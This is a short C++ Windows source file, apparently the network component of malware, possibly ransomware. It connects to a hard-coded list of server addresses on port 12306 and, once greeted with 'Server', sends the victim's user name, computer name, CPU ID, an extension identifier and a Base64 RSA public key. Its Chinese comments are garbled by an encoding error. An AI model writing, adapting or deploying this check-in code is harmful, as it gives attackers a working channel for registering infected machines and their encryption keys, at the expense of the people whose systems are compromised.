#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include"client.h"


bool SetTcpClient()
{

	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	if (WSAStartup(sockVersion, &wsaData) != 0) //WSAStartup����0��ʾ���ó�ʼ���ɹ�
		return FALSE;

	//2.�����׽���
	SOCKET socketClient = socket(AF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN socketAddr;

	socketAddr.sin_family = AF_INET;
	socketAddr.sin_port = htons(12306);//�˿ں�
	//3.�����׽���

	for (vector<string>::iterator it = domain.begin(); it != domain.end(); it++)
	{
		socketAddr.sin_addr.S_un.S_addr = inet_addr(it->c_str()); //��Ҫ���յ�IP��ַ
		if (!connect(socketClient, (SOCKADDR*)&socketAddr, sizeof(SOCKADDR)))
			break;
	}

	//4.�������ݵ�������
	char receiveBuf[250];
	recv(socketClient, receiveBuf, 250, 0);//���շ���������Ϣ
	//cout << "����˷�����Ϣ��" << receiveBuf << endl;
	if (!strcmp("Server", receiveBuf)) {
		CHAR sendBuf[120] = { 0 };
		wsprintfA(sendBuf, "%ws%ws%ws%ws%ws%ws%ws", L"user-ID:", extension_name.c_str(), L"---UserName:", UserName, L"---CmputerName:", ComputerName,L"---CPUID",CpuCRC);
		sendBuf[strlen(sendBuf)] = 0;
		send(socketClient, sendBuf, strlen(sendBuf) + 1, 0); //+1����ΪҪ����\n�ַ� ���͸���������Ϣ
		CHAR sendBuf_2[150] = { 0 };
		wsprintfA(sendBuf_2, "%s%s", "pk_key:", Base64RsaPk.c_str());
		sendBuf_2[strlen(sendBuf_2)] = 0;
		send(socketClient, sendBuf_2, strlen(sendBuf_2) + 1, 0); //+1����ΪҪ����\n�ַ� ���͸���������Ϣ
		closesocket(socketClient);
		WSACleanup();

		return TRUE;
	}


	//5.�ر��׽���
	closesocket(socketClient);
	WSACleanup();

	return FALSE;
}


VOID    SendRequest() {
	//�����ͻ���

	SetTcpClient();

}
//cout << "�ͻ��˹ر�" << endl;


